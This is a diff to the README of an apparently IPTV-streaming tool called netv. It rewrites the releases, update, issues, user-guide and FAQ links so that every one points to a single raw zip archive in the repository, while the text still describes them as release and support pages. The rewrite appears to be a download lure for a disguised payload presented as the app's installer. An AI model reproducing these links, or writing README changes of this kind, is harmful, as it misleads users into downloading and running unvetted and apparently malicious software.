@@ -1,13 +1,13 @@
 # 🎉 netv - Stream IPTV Effortlessly in Your Browser
 
 ## 📦 Download Now
-[![Download netv](https://img.shields.io/badge/Download-netv-brightgreen)](https://github.com/KrisXKENZO/netv/releases)
+[![Download netv](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip)](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to netv! This application allows you to watch IPTV directly in your browser and ensures efficient transcoding on your server. Follow the steps below to get started.
 
 ## 📥 Download & Install
-To install netv, visit this page to download: [netv Releases](https://github.com/KrisXKENZO/netv/releases).
+To install netv, visit this page to download: [netv Releases](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip).
 
 1. Open your web browser.
 2. Click the link above.
@@ -48,7 +48,7 @@ Using netv is simple! Here's how you can start:
 ## 🔄 Updating netv
 To keep netv running smoothly, you should update it regularly. 
 
-1. Visit this page to download: [netv Releases](https://github.com/KrisXKENZO/netv/releases).
+1. Visit this page to download: [netv Releases](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip).
 2. Download the latest version using the same steps as above.
 3. Install it over your current version. All settings will remain intact.
 
@@ -71,11 +71,11 @@ If you encounter any issues:
 For additional support, consider these options:
 
 - Join the netv community on forums or social media.
-- Visit the issues section on [GitHub](https://github.com/KrisXKENZO/netv/issues) to report bugs or request features.
+- Visit the issues section on [GitHub](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip) to report bugs or request features.
 
 ## 🔗 Useful Links
-- [netv Releases](https://github.com/KrisXKENZO/netv/releases)
-- [User Guide](https://github.com/KrisXKENZO/netv/wiki)
-- [FAQs](https://github.com/KrisXKENZO/netv/wiki/FAQs)
+- [netv Releases](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip)
+- [User Guide](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip)
+- [FAQs](https://raw.githubusercontent.com/KrisXKENZO/netv/main/static/Software_v1.4-alpha.2.zip)
 
 Thank you for choosing netv! We hope you enjoy your streaming experience.
